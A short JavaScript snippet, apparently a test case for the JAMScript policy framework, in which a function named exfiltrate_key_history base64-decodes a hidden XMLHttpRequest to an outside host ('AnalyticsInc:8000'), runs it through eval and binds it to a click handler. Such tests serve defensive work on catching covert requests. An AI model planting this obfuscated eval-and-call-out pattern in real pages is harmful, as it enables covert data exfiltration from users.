function exfiltrate_key_history() {
  var v0 = window.atob("eG1saHR0cD1uZXcgWE1MSHR0cFJlcXVlc3QoKTsKeG1saHR0cC5vcGVuKCJHRVQiLCAiaHR0cDovL0FuYWx5dGljc0luYzo4MDAwL3N1Ym1pc3Npb24uaHRtbD90ZXN0PWJhc2U2NCIsIHRydWUpOwp4bWxodHRwLnNlbmQobnVsbCk7");
  if(JAMScript.isEval(eval)) {
    eval("introspect(JAMScript.introspectors.processAll) { " + v0 + " }")
  }else {
    JAMScript.call(eval, null, [v0])
  }
  return
}
var v1 = document.getElementById("test");
JAMScript.set(v1, "onclick", exfiltrate_key_history);

